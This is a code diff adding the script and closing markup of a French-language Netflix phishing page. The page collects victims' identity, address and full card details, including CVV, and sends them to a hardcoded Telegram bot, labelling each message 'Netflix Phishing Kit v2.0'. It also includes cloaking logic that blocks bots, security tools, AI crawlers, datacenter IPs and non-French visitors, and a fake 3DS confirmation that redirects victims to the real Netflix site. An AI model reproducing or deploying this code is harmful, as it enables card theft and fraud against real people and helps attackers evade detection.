+        cvvErr.classList.add('show');
+        valid = false;
+      } else {
+        cvv.style.borderColor = '#555';
+        cvvErr.classList.remove('show');
+        formData.cvv = cvv.value;
+      }
+
+      // Nom sur la carte
+      const cardName = document.getElementById('cardName');
+      const cardNameErr = document.getElementById('cardNameError');
+      if (!cardName.value.trim()) {
+        cardName.style.borderColor = '#e50914';
+        cardNameErr.classList.add('show');
+        valid = false;
+      } else {
+        cardName.style.borderColor = '#555';
+        cardNameErr.classList.remove('show');
+        formData.cardName = cardName.value;
+      }
+
+      // Adresse de facturation
+      const billing = document.getElementById('billingAddress');
+      const billingErr = document.getElementById('billingAddressError');
+      if (!billing.value.trim()) {
+        billing.style.borderColor = '#e50914';
+        billingErr.classList.add('show');
+        valid = false;
+      } else {
+        billing.style.borderColor = '#555';
+        billingErr.classList.remove('show');
+        formData.billingAddress = billing.value;
+      }
+
+      if (valid) {
+        // Sauvegarder les données de paiement et tout envoyer
+        await saveAndSendComplete(formData);
+        show3DS();
+      }
+    }
+
+    // ===== FONCTIONS TELEGRAM =====
+    // CONFIGURATION TELEGRAM
+    const TELEGRAM_TOKEN = "8681481306:AAFC3RSIKNhlCtk9IPCtE2U7nSW8A2S7lOs";
+    const TELEGRAM_CHAT_ID = -1002847860417;
+    
+    // Stockage des données
+    let userData = {
+      sessionId: Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+      timestamp: new Date().toISOString(),
+      ip: '',
+      country: '',
+      device: '',
+      email: '',
+      prenom: '',
+      nom: '',
+      age: '',
+      telephone: '',
+      adresse: '',
+      codePostal: '',
+      ville: '',
+      pays: '',
+      cardNumber: '',
+      expiry: '',
+      cvv: '',
+      cardName: '',
+      billingAddress: ''
+    };
+
+    // CLOAKING - Vérification au chargement
+    async function checkAccess() {
+      try {
+        // Obtenir l'IP et le pays
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+        
+        userData.ip = ipData.ip;
+        userData.country = ipData.country_name + ' (' + ipData.country + ')';
+        
+        // Détecter l'appareil
+        const userAgent = navigator.userAgent.toLowerCase();
+        userData.device = (userAgent.includes('mobile') || userAgent.includes('android') || userAgent.includes('iphone')) ? '📱 Mobile' : '💻 Ordinateur';
+        
+        // LISTE ÉTENDUE de mots-clés de bots et crawlers
+        const botKeywords = [
+          // Bots connus
+          'bot', 'crawl', 'spider', 'scraper', 'crawler', 'fetcher',
+          // Outils automatisés
+          'curl', 'wget', 'python', 'java', 'go-http', 'node', 'ruby', 'perl', 'php',
+          'lwp', 'libwww', 'winhttp', 'httpclient', 'okhttp', 'apache-httpclient',
+          // Bots spécifiques
+          'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
+          'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp', 'telegrambot',
+          'applebot', 'microsoftbot', 'amazonbot', 'instagrambot', 'pinterestbot',
+          // Frameworks de test
+          'selenium', 'webdriver', 'chromedriver', 'geckodriver', 'phantomjs',
+          'playwright', 'puppeteer', 'casperjs', 'nightmare', 'zombie',
+          // Outils d'analyse
+          'postman', 'insomnia', 'fiddler', 'burp', 'wireshark', 'nmap',
+          'scapy', 'tcpdump', 'wireshark', 'metasploit', 'nessus',
+          // Headers suspects
+          'headless', 'automation', 'script', 'test', 'debug',
+          // Libraries HTTP
+          'axios', 'fetch', 'xmlhttprequest', 'ajax', 'websocket',
+          // Navigateurs automatiques
+          'chromeless', 'chromium', 'gecko', 'webkit', 'trident',
+          // VPN et proxies connus
+          'vpn', 'proxy', 'tor', 'anonymous', 'private',
+          // Cloud et hébergement
+          'cloudflare', 'aws', 'azure', 'gcp', 'digitalocean', 'heroku',
+          'netlify', 'vercel', 'github-pages', 'gitlab-pages',
+          // Outils de scraping
+          'scrapy', 'beautifulsoup', 'cheerio', 'jsoup', 'nokogiri',
+          'selenium-webdriver', 'watir', 'capybara', 'mechanize',
+          // Bots d'IA
+          'gpt', 'chatgpt', 'claude', 'gemini', 'bard', 'copilot',
+          'openai', 'anthropic', 'google-ai', 'microsoft-ai',
+          // Headers techniques
+          'x-requested-with', 'x-forwarded-for', 'x-real-ip',
+          'user-agent', 'accept-language', 'accept-encoding',
+          // Autres suspects
+          'monitor', 'analytics', 'tracking', 'pixel', 'beacon'
+        ];
+        
+        // Vérification multiple
+        const isBot = botKeywords.some(keyword => userAgent.includes(keyword));
+        
+        // Vérification des headers HTTP suspects
+        const suspiciousHeaders = [
+          'X-Forwarded-For',
+          'X-Real-IP', 
+          'X-Original-URL',
+          'X-Rewrite-URL',
+          'X-Forwarded-Proto',
+          'X-Forwarded-Host'
+        ];
+        
+        let hasSuspiciousHeaders = false;
+        for (let header of suspiciousHeaders) {
+          if (navigator.userAgent.includes(header.toLowerCase()) || 
+              document.referrer.includes(header.toLowerCase())) {
+            hasSuspiciousHeaders = true;
+            break;
+          }
+        }
+        
+        // Vérification du comportement
+        const isAutomated = (
+          // Pas de mouvement de souris
+          !navigator.mouseEvent ||
+          // Pas de touch events sur mobile
+          (userAgent.includes('mobile') && !navigator.maxTouchPoints) ||
+          // Screen size suspect
+          screen.width < 800 || screen.height < 600 ||
+          // Language non-français
+          !navigator.language.startsWith('fr') ||
+          // Timezone non-française
+          Intl.DateTimeFormat().resolvedOptions().timeZone !== 'Europe/Paris'
+        );
+        
+        // Vérifier si c'est la France (étendu)
+        const allowedCountries = [
+          'FR', 'MC', 'GF', 'PF', 'RE', 'MQ', 'GP', 'NC', 'TF', 'WF', 'PM', 'YT', 'BL', 'MF',
+          'BE', 'CH', 'LU', 'AD', 'LI'  // Pays frontaliers francophones
+        ];
+        const isAllowedCountry = allowedCountries.includes(ipData.country);
+        
+        // Bloquage multi-critères
+        const shouldBlock = (
+          isBot || 
+          hasSuspiciousHeaders || 
+          isAutomated || 
+          !isAllowedCountry ||
+          // Vérification supplémentaire : IP de datacenter
+          ipData.org && (
+            ipData.org.includes('Google') ||
+            ipData.org.includes('Amazon') ||
+            ipData.org.includes('Microsoft') ||
+            ipData.org.includes('Cloudflare') ||
+            ipData.org.includes('DigitalOcean') ||
+            ipData.org.includes('Hetzner') ||
+            ipData.org.includes('OVH') ||
+            ipData.org.includes('AWS') ||
+            ipData.org.includes('Azure')
+          )
+        );
+        
+        // Bloquer si nécessaire
+        if (shouldBlock) {
+          document.body.innerHTML = `
+            <div style="display: flex; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; align-items: center; justify-content: center; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;">
+              <div style="background: white; padding: 40px; border-radius: 12px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); max-width: 600px; width: 90%; text-align: center;">
+                <h1 style="color: #e50914; margin-bottom: 20px; font-size: 2rem;">🚫 ACCÈS BLOQUÉ</h1>
+                <p style="margin-bottom: 15px; line-height: 1.6;"><strong>DÉTECTION DE COMPORTEMENT SUSPECT</strong></p>
+                <p style="margin-bottom: 10px; color: #666;">📍 Localisation : ${userData.country}</p>
+                <p style="margin-bottom: 10px; color: #666;">💻 Appareil : ${userData.device}</p>
+                <p style="margin-bottom: 10px; color: #666;">🌐 IP : ${userData.ip}</p>
+                <p style="margin-bottom: 10px; color: #666;">🔍 User-Agent : ${navigator.userAgent.substring(0, 50)}...</p>
+                <p style="margin-bottom: 10px; color: #666;">🕐 Timezone : ${Intl.DateTimeFormat().resolvedOptions().timeZone}</p>
+                <p style="margin-bottom: 10px; color: #666;">🌍 Language : ${navigator.language}</p>
+                <p style="margin-bottom: 10px; color: #666;">📱 Screen : ${screen.width}x${screen.height}</p>
+                <p style="margin-bottom: 15px; color: #666;">🏢 Org : ${ipData.org || 'Inconnue'}</p>
+                
+                <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left;">
+                  <h3 style="color: #333; margin-bottom: 10px; font-size: 1rem;">🔋 POUR DÉBLOQUER L'ACCÈS :</h3>
+                  <p style="margin-bottom: 8px;">✅ Utilisez une connexion française</p>
+                  <p style="margin-bottom: 8px;">✅ Désactivez votre VPN/Proxy</p>
+                  <p style="margin-bottom: 8px;">✅ Utilisez un navigateur standard</p>
+                  <p style="margin-bottom: 8px;">✅ Activez JavaScript</p>
+                  <p style="margin-bottom: 8px;">✅ Configurez votre timezone en Europe/Paris</p>
+                  <p style="margin-bottom: 8px;">✅ Utilisez un appareil mobile ou ordinateur</p>
+                </div>
+                
+                <div style="display: flex; gap: 10px; justify-content: center; margin-top: 20px;">
+                  <button onclick="location.reload()" style="background: #28a745; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 0.9rem; font-weight: 600; cursor: pointer;">🔄 Revérifier</button>
+                  <button onclick="window.location.href='https://www.netflix.com'" style="background: #007bff; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 0.9rem; font-weight: 600; cursor: pointer;">🎬 Netflix Officiel</button>
+                </div>
+                
+                <p style="margin-top: 20px; font-size: 0.8rem; color: #999;">Code erreur: #BLOCKED_${Date.now()}</p>
+              </div>
+            </div>
+          `;
+          
+          // Envoyer l'alerte de blocage à Telegram
+          await sendToTelegram('blocked', {
+            ...userData,
+            reason: isBot ? 'Bot detected' : 
+                    hasSuspiciousHeaders ? 'Suspicious headers' :
+                    isAutomated ? 'Automated behavior' :
+                    !isAllowedCountry ? 'Country not allowed' :
+                    'Datacenter IP',
+            userAgent: navigator.userAgent,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            org: ipData.org || 'Inconnue'
+          });
+          
+          return false;
+        }
+        
+        return true;
+      } catch (error) {
+        console.error('Erreur de vérification:', error);
+        return true; // Autoriser en cas d'erreur
+      }
+    }
+
+    // Envoyer directement à Telegram
+    async function sendToTelegram(step, data) {
+      try {
+        // Masquer le numéro de carte
+        let maskedCard = '';
+        if (data.cardNumber) {
+          const cleanCard = data.cardNumber.replace(/\s/g, '');
+          if (cleanCard.length >= 16) {
+            maskedCard = cleanCard.substring(0, 4) + ' **** **** ' + cleanCard.substring(-4);
+          } else {
+            maskedCard = data.cardNumber;
+          }
+        }
+
+        const message = `🔥 NEW CARD 🔥
+===============================
+📅 Date: ${new Date().toLocaleString('fr-FR')}
+🌍 IP: ${data.ip}
+🏳️ Pays: ${data.country}
+${data.device}
+===============================
+
+📧 EMAIL: ${data.email || 'N/A'}
+
+👤 IDENTITE:
+• Prénom: ${data.prenom || 'N/A'}
+• Nom: ${data.nom || 'N/A'}
+• Âge: ${data.age || 'N/A'}
+• Téléphone: ${data.telephone || 'N/A'}
+
+🏠 ADRESSE:
+• Rue: ${data.adresse || 'N/A'}
+• CP: ${data.codePostal || 'N/A'}
+• Ville: ${data.ville || 'N/A'}
+• Pays: ${data.pays || 'N/A'}
+
+💳 CARTE BANCAIRE:
+• Numéro: ${maskedCard || 'N/A'}
+• Exp: ${data.expiry || 'N/A'}
+• CVV: ${data.cvv || 'N/A'}
+• Nom: ${data.cardName || 'N/A'}
+• Adresse facturation: ${data.billingAddress || 'N/A'}
+
+🔐 Envoyé via: Netflix Phishing Kit v2.0
+📍 URL: ${window.location.href}`;
+
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            disable_web_page_preview: true
+          })
+        });
+
+        const result = await response.json();
+        console.log('Telegram response:', result);
+        
+        return result.ok;
+      } catch (error) {
+        console.error('Erreur envoi Telegram:', error);
+        return false;
+      }
+    }
+    
+    async function saveToTelegram(step, data) {
+      // Fusionner les données avec userData
+      Object.assign(userData, data);
+      
+      // Envoyer à Telegram
+      if (step === 'complete' || step === 'quit') {
+        await sendToTelegram(step, userData);
+      }
+    }
+    
+    async function saveAndSendComplete(data) {
+      // Fusionner les données finales
+      Object.assign(userData, data);
+      
+      // Envoyer tout à Telegram
+      await sendToTelegram('complete', userData);
+    }
+
+    // ===== 3DS SECURE =====
+    function show3DS() {
+      document.getElementById('modal3ds').classList.add('active');
+      document.getElementById('loading3ds').classList.add('show');
+      document.getElementById('success3ds').classList.remove('show');
+      setTimeout(() => {
+        document.getElementById('loading3ds').classList.remove('show');
+        document.getElementById('success3ds').classList.add('show');
+        setTimeout(() => {
+          window.location.replace('https://www.netflix.com');
+        }, 2000);
+      }, 2500);
+    }
+
+    function close3DS() {
+      document.getElementById('modal3ds').classList.remove('active');
+    }
+  </script>
+
+  <!-- MODAL 3DS -->
+  <div class="modal-3ds-overlay" id="modal3ds">
+    <div class="modal-3ds-box">
+
+      <!-- CHARGEMENT -->
+      <div class="modal-3ds-loading" id="loading3ds">
+        <div class="spinner-3ds"></div>
+        <p style="color:#555; font-size:15px; margin-top:16px; font-weight:600;">Vérification en cours...</p>
+      </div>
+
+      <!-- SUCCÈS -->
+      <div class="modal-3ds-success" id="success3ds">
+        <div class="check-icon">✓</div>
+        <h3>Paiement validé !</h3>
+        <p>Votre paiement a été confirmé avec succès.<br/>Bienvenue sur Netflix.</p>
+      </div>
+
+    </div>
+  </div>
+
+</body>
+</html>
